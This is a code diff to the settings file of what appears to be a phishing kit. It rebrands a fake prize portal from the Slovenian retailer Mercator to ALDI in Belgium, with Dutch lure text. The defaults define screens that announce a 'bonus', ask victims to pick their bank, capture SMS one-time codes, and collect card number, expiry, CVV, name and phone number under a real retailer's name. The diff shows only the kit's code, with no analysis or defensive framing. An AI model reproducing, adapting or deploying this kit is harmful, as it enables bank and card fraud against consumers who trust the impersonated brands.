@@ -55,7 +55,7 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 };
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
-const ALBERT_HEIJN_LOGO_URL = "/form-assets/mercator-logo.png";
+const ALBERT_HEIJN_LOGO_URL = "/form-assets/aldi-logo.png";
 const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
@@ -76,88 +76,88 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     next.logo_url === "/logo.png" ||
     next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
   ) {
-    next.logo_url = "/form-assets/mercator-logo.png";
+    next.logo_url = "/form-assets/aldi-logo.png";
   }
 
   if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
     next.bg_url = PORTAL_BG_URL;
   }
 
-  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
-    next.portal_name = "Mercator Portal za Stranke";
+  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME || /mercator|portal za stranke/i.test(next.portal_name)) {
+    next.portal_name = "ALDI klantenportaal";
   }
 
-  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
-    next.support_center_name = "Mercator Pomoč Uporabnikom";
+  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME || /mercator|pomoč/i.test(next.support_center_name)) {
+    next.support_center_name = "ALDI klantenservice";
   }
 
-  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
-    next.win_title = "Ekskluzivna Mercator Nagrada";
+  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE || /mercator|ekskluzivna/i.test(next.win_title)) {
+    next.win_title = "Exclusieve ALDI-bonus";
   }
 
-  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
+  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE || /mercator|čestitamo|prevzem/i.test(next.win_subtitle)) {
     next.win_subtitle =
-      "Čestitamo! Izbrani ste bili za današnjo Mercator akcijo. Kliknite spodnji gumb, da prevzamete nagrado do 2 500 €.";
+      "Gefeliciteerd! U bent geselecteerd voor de ALDI-actie van vandaag. Klik op de onderstaande knop om uw bonus op te eisen.";
   }
 
-  if (!next.target_country || next.target_country === "Hollanda" || next.target_country === "Estonya") {
-    next.target_country = "Slovenija";
+  if (!next.target_country || ["Hollanda", "Estonya", "Slovenija", "Slovenia"].includes(next.target_country)) {
+    next.target_country = "Belçika";
   }
 
   if (next.target_country) {
     next.target_country = normalizeCountryName(next.target_country);
   }
 
-  if (!next.site_language || next.site_language === "nl" || next.site_language === "et" || next.site_language === "lt") {
-    next.site_language = "sl";
+  if (!next.site_language || next.site_language === "et" || next.site_language === "lt" || next.site_language === "sl") {
+    next.site_language = "nl";
   }
 
   return next;
 }
 
 export const defaultSettings: GlobalSettings = {
-  logo_url: "/form-assets/mercator-logo.png",
+  logo_url: "/form-assets/aldi-logo.png",
   bg_url: PORTAL_BG_URL,
-  portal_name: "Mercator Portal za Stranke",
-  support_center_name: "Mercator Pomoč Uporabnikom",
-  win_title: "Ekskluzivna Mercator Nagrada",
+  portal_name: "ALDI klantenportaal",
+  support_center_name: "ALDI klantenservice",
+  win_title: "Exclusieve ALDI-bonus",
   win_subtitle:
-    "Čestitamo! Izbrani ste bili za današnjo Mercator akcijo. Kliknite spodnji gumb, da prevzamete svojo nagrado.",
-  win_button: "Prevzemi nagrado",
-  banken_title: "Izberite svojo banko",
-  banken_subtitle: "Za nadaljevanje izberite svojo banko.",
-  banken_search_placeholder: "Išči banko...",
-  wait_title: "Prosimo, počakajte",
-  wait_subtitle: "Vaša zahteva se varno obdeluje...",
-  sms_title: "Varnostna koda SMS",
-  sms_subtitle: "Vnesite {digits}-mestno kodo.",
-  sms_input_label: "Enkratna koda",
-  sms_button: "Potrdi",
-  sms_loading: "Obdelava...",
-  card_title: "Podatki o plačilu",
-  card_subtitle: "Preverite in potrdite svoje podatke.",
-  card_owner_label: "Ime imetnika kartice",
-  card_number_label: "Številka kartice",
-  card_expiry_label: "Datum poteka MM/LL",
-  card_cvv_label: "Varnostna koda",
-  card_button: "Nadaljuj",
-  code_title: "Dobrodošli",
-  code_subtitle: "Vnesite kodo za sodelovanje, ki ste jo prejeli od {partner}, da odklenete svojo nagrado.",
-  code_button: "Potrdi kodo",
-  live_support_title: "Pomoč v živo",
+    "Gefeliciteerd! U bent geselecteerd voor de ALDI-actie van vandaag. Klik op de onderstaande knop om uw bonus op te eisen.",
+  win_button: "Bonus claimen",
+  banken_title: "Kies uw bank",
+  banken_subtitle: "Kies uw Belgische bank om verder te gaan.",
+  banken_search_placeholder: "Zoek uw bank...",
+  wait_title: "Even geduld",
+  wait_subtitle: "Uw aanvraag wordt veilig verwerkt...",
+  sms_title: "SMS-beveiligingscode",
+  sms_subtitle: "Voer de {digits}-cijferige code in.",
+  sms_input_label: "Eenmalige code",
+  sms_button: "Bevestigen",
+  sms_loading: "Verwerken...",
+  card_title: "Betaalgegevens",
+  card_subtitle: "Controleer en bevestig uw gegevens.",
+  card_owner_label: "Naam kaarthouder",
+  card_number_label: "Kaartnummer",
+  card_expiry_label: "Vervaldatum MM/JJ",
+  card_cvv_label: "Beveiligingscode",
+  card_button: "Doorgaan",
+  code_title: "Welkom",
+  code_subtitle: "Voer de deelnamecode in die u van {partner} heeft ontvangen om uw prijs te ontgrendelen.",
+  code_button: "Code bevestigen",
+  live_support_title: "Live-ondersteuning",
   live_support_subtitle:
-    "Za nadaljevanje se morate obrniti na našo podporo.\n\nKliknite spodnji gumb za začetek pogovora.",
-  live_support_button: "Začni pogovor",
-  profile_title_small: "Nagrada potrjena",
-  profile_title_main: "Vaš znesek nagrade",
-  profile_subtitle: "Potrdite svoje podatke za nadaljnjo obdelavo.",
-  profile_firstname_label: "Ime",
-  profile_lastname_label: "Priimek",
-  profile_phone_label: "Številka mobilnega telefona",
-  profile_button: "Naprej",
-  profile_loading_text: "Obdelava...",
-  site_language: "sl",
-  target_country: "Slovenija",
+    "Om verder te gaan, moet u contact opnemen met onze klantenservice.\n\nKlik op de onderstaande knop om het gesprek te starten.",
+  live_support_button: "Start gesprek",
+  profile_title_small: "Prijsbevestiging",
+  profile_title_main: "Uw bonusbedrag",
+  profile_subtitle: "Bevestig uw gegevens voor verdere verwerking.",
+  profile_firstname_label: "Voornaam",
+  profile_lastname_label: "Achternaam",
+  profile_phone_label: "Mobiel telefoonnummer",
+  profile_button: "Doorgaan",
+  profile_loading_text: "Verwerken...",
+  site_language: "nl",
+  target_country: "Belçika",
   wheel_settings: {},
 };
 
